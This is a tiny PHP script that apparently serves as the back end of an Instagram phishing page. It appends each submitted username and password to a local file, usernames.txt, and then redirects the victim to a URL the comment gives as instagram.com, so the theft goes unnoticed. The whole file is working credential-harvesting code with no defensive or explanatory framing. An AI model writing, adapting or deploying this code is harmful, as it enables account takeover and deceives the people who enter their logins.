<?php

file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://instagram.com
header("Location: $url");
exit();
?>